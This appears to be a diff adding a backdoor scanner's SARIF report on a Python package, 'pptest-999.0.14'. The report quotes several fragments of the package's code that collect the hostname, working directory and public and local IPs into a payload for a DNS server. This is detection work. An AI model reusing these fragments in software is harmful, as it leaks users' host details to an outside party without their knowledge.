+                      "text": "    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n",
+                      "markdown": "`    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 50,
+                  "startColumn": 25,
+                  "endLine": 50,
+                  "endColumn": 34,
+                  "snippet": {
+                    "text": "            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\n            #res = opener.open(req)\n            #public_ip = (res.read().decode('utf-8'))\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\n",
+                    "rendered": {
+                      "text": "            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\n            #res = opener.open(req)\n            #public_ip = (res.read().decode('utf-8'))\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\n",
+                      "markdown": "`            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\n            #res = opener.open(req)\n            #public_ip = (res.read().decode('utf-8'))\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 37,
+                  "startColumn": 32,
+                  "endLine": 37,
+                  "endColumn": 41,
+                  "snippet": {
+                    "text": "            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            #print(res)\n\n",
+                    "rendered": {
+                      "text": "            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            #print(res)\n\n",
+                      "markdown": "`            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            #print(res)\n\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000700"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration",
+            "id": "BD000700"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 34,
+                  "startColumn": 33,
+                  "endLine": 34,
+                  "endColumn": 38,
+                  "snippet": {
+                    "text": "        if python_version >= '3.0':\n            import urllib.request\n            #import requests\n            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n",
+                    "rendered": {
+                      "text": "        if python_version >= '3.0':\n            import urllib.request\n            #import requests\n            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n",
+                      "markdown": "`        if python_version >= '3.0':\n            import urllib.request\n            #import requests\n            #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 83,
+                  "startColumn": 14,
+                  "endLine": 83,
+                  "endColumn": 22,
+                  "snippet": {
+                    "text": "    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    #print('2')\n    payload_to_send = payload\n    print(payload)\n",
+                    "rendered": {
+                      "text": "    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    #print('2')\n    payload_to_send = payload\n    print(payload)\n",
+                      "markdown": "`    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    #print('1')\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    #print('2')\n    payload_to_send = payload\n    print(payload)\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 65,
+                  "startColumn": 18,
+                  "endLine": 65,
+                  "endColumn": 26,
+                  "snippet": {
+                    "text": "    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n",
+                    "rendered": {
+                      "text": "    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n",
+                      "markdown": "`    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    #print('public ip :'+str(get_wan_ip()))\n    #\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 61,
+                  "startColumn": 40,
+                  "endLine": 61,
+                  "endColumn": 48,
+                  "snippet": {
+                    "text": "def get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n",
+                    "rendered": {
+                      "text": "def get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n",
+                      "markdown": "`def get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n    #public_ip = requests.get('http://ifconfig.me/ip', timeout=1).text.strip()\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        },
+        {
+          "rule": {
+            "id": "BD000704"
+          },
+          "message": {
+            "text": "Backdoor: Data Exfiltration (Hostname)",
+            "id": "BD000704"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "address": {
+                  "relativeAddress": -1,
+                  "fullyQualifiedName": "/tmp/datasets/dataset1/python/pptest-999.0.14.tar.gz/pptest-999.0.14.tar/pptest-999.0.14/pptest/__init__.py"
+                },
+                "region": {
+                  "startLine": 60,
+                  "startColumn": 4,
+                  "endLine": 60,
+                  "endColumn": 12,
+                  "snippet": {
+                    "text": "    return public_ip\ndef get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n",
+                    "rendered": {
+                      "text": "    return public_ip\ndef get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n",
+                      "markdown": "`    return public_ip\ndef get_info(dns_server):\n    \n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    \n    #print 'jsonip.com', my_ip\n`"
+                    }
+                  },
+                  "sourceLanguage": "python"
+                }
+              }
+            }
+          ],
+          "properties": {
+            "Severity": 2,
+            "Confidence": 1
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
